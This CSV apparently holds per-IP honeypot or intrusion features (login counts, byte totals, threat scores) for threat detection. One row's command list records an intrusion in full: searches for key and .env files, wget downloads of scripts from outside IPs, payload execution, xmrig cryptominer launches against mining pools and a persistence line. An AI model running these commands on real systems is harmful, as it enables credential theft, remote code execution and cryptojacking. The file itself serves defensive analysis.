src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score
126.135.95.87,22,1,4,18,2,2,1,1,16,22,22,0,826.0,72172.0,26821.0,22,0,1,1,0,"['who', 'uname -a', ""find / -name '*.key' 2>/dev/null | head -10"", ""find /home -name '*.env' 2>/dev/null"", 'ls -la /home/ubuntu', 'ls /home', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', '/tmp/payload.sh &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', 'cat /proc/cpuinfo | grep processor | wc -l', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'quit']","who(1), uname -a(1), find / -name '*.key' 2>/dev/null | head -10(1), find /home -name '*.env' 2>/dev/null(1), ls -la /home/ubuntu(1)","who, uname -a, find / -name '*.key' 2>/dev/null | head -10, find /home -name '*.env' 2>/dev/null, ls -la /home/ubuntu, ls /home, find / -name '*.conf' -readable 2>/dev/null | head -20, wget -q http://45.142.212.100/setup.sh -P /tmp/, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, /tmp/payload.sh &",16,2,1,0,0.17391304347826086,0.782608695652174,0.6,8.0,2.690776228469167,6.869565217391305,6.893922380701195,0.1312968836298716
128.154.221.227,9,1,9,0,5,5,1,1,0,9,9,0,15.0,1296.0,649.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.9938461538461538,4.5,9.0,0.5734846917018852
128.29.122.16,5,1,5,0,1,1,1,1,0,5,5,0,8.0,2296.0,1127.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.0354609929078014,4.166666666666667,5.0,0.33849906653885736
13.192.198.162,8,1,8,0,4,4,1,1,0,8,8,0,11.0,2630.0,325.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,8.067484662576687,4.444444444444445,8.0,0.5098330169714468
13.213.21.45,10,1,10,0,6,6,1,1,0,10,10,0,22.0,1169.0,1331.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,0.8776276276276276,5.454545454545454,10.0,0.5168880195357922
131.82.32.78,5,1,5,0,1,1,1,1,0,5,5,0,15.0,1036.0,932.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1103965702036442,5.0,5.0,0.41090851121057226
132.213.169.32,11,1,11,0,7,7,1,1,0,11,11,0,24.0,1306.0,1465.0,11,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,0.8908594815825375,6.416666666666667,11.0,0.47998745743059545
134.108.154.85,11,1,11,0,6,6,1,1,0,11,11,0,28.0,1508.0,1092.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,1.3796889295516925,4.583333333333333,11.0,0.549033902962195
134.82.29.232,8,1,8,0,4,4,1,1,0,8,8,0,3.0,669.0,1278.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,0.5230648944487881,5.333333333333333,8.0,0.4293719622555323
135.148.165.123,11,1,11,0,7,6,1,1,0,11,11,0,3.0,1933.0,1003.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,1.9252988047808766,5.5,11.0,0.5152490936534969
135.216.187.71,8,1,8,0,4,4,1,1,0,8,8,0,23.0,1782.0,312.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,5.693290734824281,5.333333333333333,8.0,0.4076428045222016
